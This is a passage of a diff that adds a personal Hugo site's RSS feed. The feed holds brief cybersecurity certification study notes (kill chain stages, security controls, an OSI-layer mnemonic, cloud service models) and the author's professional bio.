+&lt;ul&gt;
+&lt;li&gt;Reconnaissance&lt;/li&gt;
+&lt;li&gt;Weaponization&lt;/li&gt;
+&lt;li&gt;Delivery&lt;/li&gt;
+&lt;li&gt;Exploitation&lt;/li&gt;
+&lt;li&gt;Installation&lt;/li&gt;
+&lt;li&gt;Command &amp;amp; Control (C2)&lt;/li&gt;
+&lt;li&gt;Exfiltration&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Security Control
+&lt;ul&gt;
+&lt;li&gt;Data Center
+&lt;ul&gt;
+&lt;li&gt;SMASH PP
+&lt;ul&gt;
+&lt;li&gt;Sniffer&lt;/li&gt;
+&lt;li&gt;Man Trap&lt;/li&gt;
+&lt;li&gt;Antivirus&lt;/li&gt;
+&lt;li&gt;Strong Password&lt;/li&gt;
+&lt;li&gt;Host Based Firewall&lt;/li&gt;
+&lt;li&gt;Popup Blocker&lt;/li&gt;
+&lt;li&gt;Proximity Badge&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;7 Layer OSI Model
+&lt;ul&gt;
+&lt;li&gt;Please Do Not Throw Sausage Pizza Away
+&lt;ul&gt;
+&lt;li&gt;Physical&lt;/li&gt;
+&lt;li&gt;Data Link&lt;/li&gt;
+&lt;li&gt;Network&lt;/li&gt;
+&lt;li&gt;Transport&lt;/li&gt;
+&lt;li&gt;Session&lt;/li&gt;
+&lt;li&gt;Presenation&lt;/li&gt;
+&lt;li&gt;Application&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Cloud Computing Modules
+&lt;ul&gt;
+&lt;li&gt;Traditional - cloud provides nothing&lt;/li&gt;
+&lt;li&gt;SaaS - cloud provides everything&lt;/li&gt;
+&lt;li&gt;PaaS - business provides Applications&lt;/li&gt;
+&lt;li&gt;IaaS - cloud provides Networking, Storage, Server HW, Virtualization (NSSHV)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Matt Hammond</title>
+      <link>http://localhost:1313/author/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/author/</guid>
+      <description>&lt;p&gt;I am a prior military professional with military aviation experience and Special Operations experience. As well as civilian aviation experience in helicopters and fixed wing stateside and abroad. I have turned an interest, hobby, and passion of IT related content into a strong knowledge in the areas of cyber network security analysis, DevOps tool administration, and information security system analysis by completing Security+, CEH, and Splunk Core User certifications. I will be using Github and my website to continue my learning and as a place to implement what I learn.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Search Result</title>
+      <link>http://localhost:1313/search/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/search/</guid>
+      <description></description>
+    </item>
+    
+  </channel>
+</rss>
